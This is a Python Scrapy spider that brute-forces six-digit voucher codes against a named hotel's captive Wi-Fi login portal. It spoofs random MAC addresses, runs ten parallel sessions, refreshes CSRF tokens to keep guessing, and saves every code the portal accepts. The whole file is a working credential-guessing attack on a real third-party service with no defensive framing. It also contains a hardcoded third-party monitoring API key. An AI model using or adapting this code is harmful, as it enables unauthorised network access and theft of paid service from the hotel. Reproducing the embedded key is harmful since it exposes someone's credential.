import logging
import random

import scrapy
from scrapy.exceptions import CloseSpider
from scrapy.spidermiddlewares.httperror import HttpError
from scrapy.utils.request import request_httprepr
from scrapy.utils.response import response_httprepr

from artinwifi.passwords import Passwords

log = logging.getLogger(__name__)


def _random_mac_address() -> str:
    population = "0123456789abcdef"
    parts = ("".join(random.choices(population=population, k=2)) for i in range(6))
    return ":".join(parts)



class Spider(scrapy.Spider):
    name = "artinwifi"

    custom_settings = {
        "LOG_LEVEL": "INFO",
        "COOKIES_DEBUG": True,
        "REQUEST_RESPONSE_DEBUG": True,
        "CONCURRENT_REQUESTS": 10,
        "LOGSTATS_INTERVAL": 10,
        "DEFAULT_REQUEST_HEADERS": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
        },
        "DOWNLOADER_MIDDLEWARES": {
            'scrapeops_scrapy.middleware.retry.RetryMiddleware': 550,
            'scrapy.downloadermiddlewares.retry.RetryMiddleware': None,
            "artinwifi.utils.LoggingDownloaderMiddleware": 0,
        },
        # dont use JOBDIR because if we do, scheduler will store there requests. Is is error prone
        "STATE_JOBDIR": "resume",
        # disable deduplication, because at some point requests to https://loceanicahotel.artinwifi.com/login
        # get deduplicated, because cookies are not added
        "DUPEFILTER_CLASS": "scrapy.dupefilters.BaseDupeFilter",
        "REQUEST_FINGERPRINTER_IMPLEMENTATION": "2.7",
        "EXTENSIONS": {
            "scrapy.extensions.spiderstate.SpiderState": None,
            "artinwifi.json_spider_state.JsonSpiderState": 0,
            'scrapeops_scrapy.extension.ScrapeOpsMonitor': 500,
        },
        "SCRAPEOPS_API_KEY": 'e837e4ea-44bf-4952-9327-cdd0d670020b',

    }

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.params = dict(start="000000", end="999999", alphabet="0123456789")
        self.params.update(kwargs)
        self.state = {}

    def start_requests(self):
        if self.state:
            log.info(f"Continuing old session")
        else:
            self.state = self.params
            log.info(f"Starting new session")
        params_str = " ".join(f"{k}={v}" for k, v in self.state.items())
        log.info(f"Params: {params_str}")

        self.passwords = iter(Passwords(**self.state).generator())

        for cookiejar in range(self.settings["CONCURRENT_REQUESTS"]):
            yield self._create_session_request(cookiejar=cookiejar)

    def _create_session_request(self, cookiejar):
        mac_address = _random_mac_address()
        url = f"https://loceanicahotel.artinwifi.com/?ssid=loceanicahotel.artinwifi&id={mac_address}&" \
              f"ip=172.16.8.242&username=&url=http://detectportal.firefox.com/canonical.html" \
              f"&ap=loceanicahotel.artinwifi&link-login-only=http://loceanicahotel.artinwifi/login"
        meta = {"cookiejar": cookiejar, "mac_address": mac_address}
        return scrapy.Request(url=url, callback=self.parse, errback=self.errback, meta=meta, headers=meta)

    def parse(self, response, **kwargs):
        password = response.meta.get("password")
        # in case of parsing first login page, there is no password, and no "Password Not Valid" message
        if password:
            if "Password Not Valid!" not in response.text:
                mac_address = response.meta.get("mac_address")
                yield dict(mac_address=mac_address, password=password)
            self.state["start"] = password

        csrf_token = response.css("input[name=csrf_token]::attr(value)").get()
        yield self._login_request(csrf_token=csrf_token, cookiejar=response.meta["cookiejar"])

    def _login_request(self, cookiejar, csrf_token):
        password = next(self.passwords, None)
        if password is None:
            raise CloseSpider("Done")

        body = f"csrf_token={csrf_token}&redirect_override=&element_2962_namesurname_value=xxx+xxx&" \
               f"element_2963_email_value=xxx%40google.com&element_2964_voucher_value={password}&" \
               f"element_2965_checkbox_value=1&next="
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        # pass cookiejar to next requests
        meta = {"cookiejar": cookiejar, "password": password}
        url = "https://loceanicahotel.artinwifi.com/login"
        return scrapy.Request(url=url, method="POST", callback=self.parse, errback=self.errback,
                             body=body, headers=headers, meta=meta)

    def errback(self, failure):
        if failure.check(HttpError) and "Session expired (invalid CSRF token)" in failure.value.response.text:
            log.info("Session expired, restarting")
            return self._create_session_request(cookiejar=failure.value.response.meta["cookiejar"])

        log.info(failure)
        log.info("Request:\n" + request_httprepr(failure.request).decode("utf-8"))
        log.info("Reponse:\n" + response_httprepr(failure.value.response).decode("utf-8"))
